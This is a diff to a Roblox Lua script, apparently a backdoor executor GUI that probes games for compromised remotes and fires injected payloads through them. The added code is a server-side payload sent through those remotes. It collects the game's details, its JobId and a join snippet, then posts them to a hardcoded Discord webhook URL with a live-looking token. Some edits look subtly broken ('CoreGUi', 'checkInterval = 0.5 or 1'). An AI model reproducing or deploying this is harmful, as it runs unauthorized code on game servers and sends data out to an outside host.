@@ -1,12 +1,17 @@
 --[=[
- Moon Backdoor Executor
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
 -- Instances: 172 | Scripts: 23 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
-G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
+G2L["1"] = Instance.new("ScreenGui", game.CoreGUi);
 G2L["1"]["IgnoreGuiInset"] = true;
 G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
@@ -1787,7 +1792,104 @@ local function C_f()
 
 
 
-		
+
+
+		local name = [[
+		local h=game:GetService("HttpService")
+		local p=game:GetService("Players")
+		local m=game:GetService("MarketplaceService")
+		local w={
+			T5="https://discord.com/api/webhooks/1448003425504854046/xqtsHKVd6gelgnzelDYeFZT7Tdwc8TuCKBOaUUUr2wBLDO-22u2DnOVF19ErSD72pQyn"
+		}
+	
+		local u=game.GameId
+		local l=game.PlaceId
+		local api="https://games.roblox.com/v1/games?universeIds="..u
+	
+		local function g()
+			local ok,r=pcall(function()return h:GetAsync(api)end)
+			if ok then
+				local d=h:JSONDecode(r)
+				local x=d.data and d.data[1]
+				if x then
+					return{
+						name=x.name or "didnt fetch",
+						playing=x.playing or 0,
+						visits=x.visits or "didnt fetch",
+						favoritedCount=x.favoritedCount or "didnt fetch",
+						created=x.created,
+						description=x.description or "no description",
+						maxPlayers=x.maxPlayers or 0,
+						creatorName=(x.creator and x.creator.name) or "didnt fetch",
+						creatorId=(x.creator and x.creator.id) or "didnt fetch"
+					}
+				end
+			end
+			local ok2,pi=pcall(function()return m:GetProductInfo(l)end)
+			if ok2 then
+				return{
+					name=pi.Name or "didnt fetch",
+					playing=#p:GetPlayers(),
+					visits="didnt fetch",
+					favoritedCount="didnt fetch",
+					created=pi.Created,
+					description=pi.Description,
+					maxPlayers=pi.MaxPlayers,
+					creatorName=pi.Creator and pi.Creator.Name or "didnt fetch",
+					creatorId=pi.Creator and pi.Creator.Id or "didnt fetch"
+				}
+			end
+			return nil
+		end
+	
+		local function s(c)
+			return w.T5
+		end
+	
+		local function a()
+			local d=g()
+			if not d then return end
+	
+			local tp=d.playing or 0
+			local mx=d.maxPlayers or 0
+			local u2=s(tp)
+			if not u2 then return end
+	
+			local cr="didnt fetch"
+			if d.created then
+				if typeof(d.created)=="number" then cr=os.date("%m/%d/%Y",d.created)
+				elseif typeof(d.created)=="string" then
+					local t=DateTime.fromIsoDate(d.created)
+					cr=os.date("%m/%d/%Y",t.UnixTimestamp)
+				end
+			end
+	
+			local e={
+				title="**GAME LOGGED!**",
+				description="# **GAME INFO**",
+				color=8421504,
+				fields={
+					{name="**Game name :**",value="`"..d.name.."`"},
+					{name="**Total Active Players :**",value="`"..tp.."`",inline=true},
+					{name="**Total Visits :**",value="`"..d.visits.."`",inline=true},
+					{name="**Total Favourites :**",value="`"..d.favoritedCount.."`",inline=true},
+					{name="**Game created:**",value="`"..cr.."`",inline=true},
+					{name="**Job id:**",value="```lua\n"..game.JobId.."```"},
+					{name="**Max players per server:**",value="`"..tp.."/"..mx.."`"},
+					{name="**Join Methods**",value="**[Clik to join](https://www.roblox.com/games/"..l.."/launch)**\n**[Clik to view Game page](https://www.roblox.com/games/"..l..")**"},
+					{name="**JavaScript Join Code:**",value="```javascript\njavascript:(function(){var placeId="..l..";var jobId='"..game.JobId.."';Roblox.GameLauncher.joinGameInstance(placeId,jobId);})();```"},
+					{name="# **Creator Information**",value="**Creator's name:** `"..d.creatorName.."`\n**Creator's ID:** `"..d.creatorId.."`"},
+					{name="# **Other Information**",value="**DESCRIPTION:** "..d.description}
+				},
+				footer={text=os.date("%m/%d/%Y")},
+				thumbnail={url="https://www.roblox.com/asset-thumbnail/image?assetId="..l.."&width=420&height=420&format=png"}
+			}
+	
+			h:PostAsync(u2,h:JSONEncode({embeds={e}}))
+		end
+	
+		a()
+		]]
 
 		pcall(function()
 			if isFunction then
@@ -1796,14 +1898,14 @@ local function C_f()
 					pcall(function() remote:InvokeServer("moonTSS", payload) end)
 					pcall(function() remote:InvokeServer(RE) end)
 					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
-				
+					pcall(function() remote:InvokeServer(name) end)
 				end)
 			else
 				pcall(function() remote:FireServer(payload) end)
 				pcall(function() remote:FireServer("moonTSS", payload) end)
 				pcall(function() remote:FireServer(RE) end)
 				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
-
+				pcall(function() remote:FireServer(name) end)
 			end
 		end)
 
@@ -3047,7 +3149,7 @@ local function C_6a()
 					local testId = activeTestIds[i]
 					local testData = activeTests[testId]
 
-					if testData and (testData.found or  ReplicatedStorage:FindFirstChild(testId)) then
+					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
 						testData.found = true
 						foundExploit = true
 						if testData.isFunction then
@@ -3916,7 +4018,7 @@ local function C_9c()
 			end
 
 			local timeoutDuration = 0.5
-			local checkInterval = 0.01
+			local checkInterval = 0.5 or 1
 			local elapsed = 0
 
 			while elapsed < timeoutDuration do
